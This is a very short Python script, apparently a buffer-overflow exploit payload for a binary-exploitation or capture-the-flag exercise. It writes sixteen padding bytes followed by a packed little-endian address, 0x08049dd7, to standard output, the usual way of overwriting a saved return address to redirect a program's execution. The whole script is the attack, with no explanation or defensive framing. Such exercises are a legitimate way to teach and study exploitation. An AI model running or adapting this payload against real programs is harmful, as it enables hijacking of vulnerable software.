from struct import pack
import sys

sys.stdout.buffer.write(('\x12'*16).encode('ASCII') + pack("<I", 0x08049dd7))
